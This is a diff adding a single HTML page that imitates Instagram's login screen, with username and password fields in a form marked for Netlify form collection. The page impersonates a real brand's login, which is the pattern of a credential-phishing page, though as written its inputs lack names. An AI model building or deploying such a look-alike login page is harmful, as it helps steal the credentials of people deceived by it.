@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div
+      class="flex flex-col md:flex-row items-center space-y-10 md:space-y-0 md:space-x-10">
+      <!-- Left Side: Instagram Image (Optional) -->
+      <div class="hidden md:block">
+        <img
+          src="https://i.imgur.com/zqpwkLQ.png"
+          alt="Instagram"
+          class="w-80" />
+      </div>
+
+      <!-- Right Side: Login Form -->
+      <div class="bg-white p-6 rounded-md shadow-md w-80">
+        <h2 class="text-center text-2xl font-bold mb-4">Instagram</h2>
+        <form name="login-form" action="#" method="POST" data-netlify="true">
+          <input
+            type="text"
+            placeholder="Phone number, username, or email"
+            class="w-full px-3 py-2 mb-3 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400" />
+          <input
+            type="password"
+            placeholder="Password"
+            class="w-full px-3 py-2 mb-3 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400" />
+          <button
+            type="submit"
+            class="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600">
+            Log In
+          </button>
+        </form>
+        <div class="text-center my-4 text-gray-500">OR</div>
+        <div class="text-center">
+          <a href="#" class="text-blue-600 font-semibold"
+            >Log in with Facebook</a
+          >
+        </div>
+        <div class="text-center mt-3">
+          <a href="#" class="text-sm text-gray-500">Forgot password?</a>
+        </div>
+      </div>
+
+      <!-- Sign Up Link -->
+      <div class="bg-white p-4 rounded-md shadow-md w-80 text-center">
+        <p class="text-gray-600">
+          Don't have an account?
+          <a href="#" class="text-blue-500 font-semibold">Sign up</a>
+        </p>
+      </div>
+    </div>
+  </body>
+</html>
